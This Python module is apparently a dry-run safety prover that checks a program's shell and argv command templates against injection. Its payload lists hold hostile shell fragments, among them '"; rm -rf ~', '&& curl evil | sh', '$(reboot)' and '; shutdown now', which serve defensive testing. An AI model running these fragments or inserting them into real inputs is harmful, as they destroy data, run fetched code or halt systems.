"""Safety prover: mechanically demonstrate that no skill in a program can be
shell-injected. For every text/word argument that reaches a shell or argv command,
fill it with classic injection payloads, render the command (without running it),
and prove the payload survives as a *single inert token* — i.e. it was quoted
(shell) or passed as one argv element (argv), so it can never become syntax.

This is what ``dianac test`` runs. It is exhaustive over (skill x injectable-arg x
payload), so a green report is a real guarantee for the given program, not a spot
check.
"""
from __future__ import annotations

import shlex
from dataclasses import dataclass

from . import nodes
from .runtime import Match, execute

# Payloads safe to embed even in a single-word slot (no whitespace).
_WORD_PAYLOADS = ["$(reboot)", "`id`", "x;reboot", "x|id", "x&&touch", "x>z", "a'b", 'a"b']
# Full payloads (with whitespace) only reach free-text slots.
_TEXT_PAYLOADS = _WORD_PAYLOADS + [
    "x'; touch /tmp/pwn; echo '",
    '"; rm -rf ~; echo "',
    "&& curl evil | sh",
    "; shutdown now",
]


@dataclass
class Probe:
    skill: str
    arg: str
    payload: str
    safe: bool
    rendered: str
    reason: str = ""


def _benign(arg: nodes.Arg):
    """A valid value for a non-target argument, respecting its constraint."""
    if arg.type in ("int", "number"):
        c = arg.constraint
        if isinstance(c, nodes.Range):
            return int((c.lo + c.hi) // 2) if arg.type == "int" else (c.lo + c.hi) / 2
        return 1
    c = arg.constraint
    if isinstance(c, nodes.Enum):
        return c.choices[0]
    return "value"


def _injectable_args(skill: nodes.Skill) -> list[nodes.Arg]:
    out = []
    for a in skill.args:
        if a.type in ("int", "number"):
            continue                       # numeric: coerced, cannot carry syntax
        if isinstance(a.constraint, nodes.Enum):
            continue                       # closed set: cannot carry syntax
        out.append(a)
    return out


def _renders_to_command(skill: nodes.Skill) -> bool:
    return isinstance(skill.runner, (nodes.ShellRunner, nodes.ArgvRunner))


def _is_safe(rendered, payload: str, runner) -> tuple[bool, str]:
    if isinstance(runner, nodes.ShellRunner):
        # quoted correctly  <=>  payload reappears as exactly one shlex token
        try:
            toks = shlex.split(rendered)
        except ValueError:
            return False, "shell string does not parse (broken quoting)"
        return (payload in toks), ("payload is one inert token" if payload in toks
                                   else "payload leaked into shell syntax")
    if isinstance(runner, nodes.ArgvRunner):
        # argv is never shell-interpreted: a value is one literal element and can
        # never split into extra arguments or become syntax. Inherently safe.
        return True, "argv element — not shell-interpreted"
    return True, "no shell/argv command"


def probe_program(program: nodes.Program) -> list[Probe]:
    probes: list[Probe] = []
    for sk in program.skills:
        if not _renders_to_command(sk):
            continue
        targets = _injectable_args(sk)
        for target in targets:
            payloads = _TEXT_PAYLOADS if target.type == "text" else _WORD_PAYLOADS
            for payload in payloads:
                args = {a.name: (payload if a.name == target.name else _benign(a)) for a in sk.args}
                gate = lambda _sk: True            # authorize so we reach the renderer
                result = execute(Match(sk, args, sk.utters[0], 0), gate=gate, dry_run=True)
                rendered = (" ".join(result.command) if isinstance(result.command, list)
                            else str(result.command))
                safe, reason = _is_safe(
                    result.command if isinstance(result.command, list) else rendered,
                    payload, sk.runner)
                probes.append(Probe(sk.name, target.name, payload, safe, rendered, reason))
    return probes


def summary(probes: list[Probe]) -> tuple[int, int]:
    passed = sum(1 for p in probes if p.safe)
    return passed, len(probes)
